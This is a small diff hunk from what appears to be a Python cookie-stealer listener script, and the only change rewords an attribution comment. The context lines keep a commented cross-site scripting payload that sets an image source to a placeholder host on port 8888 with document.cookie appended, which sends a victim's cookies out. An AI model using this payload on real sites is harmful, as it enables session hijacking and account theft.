@@ -6,7 +6,7 @@
 #   image.src='http://X.X.X.X:8888/?'+document.cookie;
 # </script>
 
-# Written by Ahmed Shawky @lnxg33k (deprecated. I fixed it - CyberLola)
+# Written by Ahmed Shawky @lnxg33k (The original version is deprecated. I fixed it - CyberLola)
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse, parse_qs
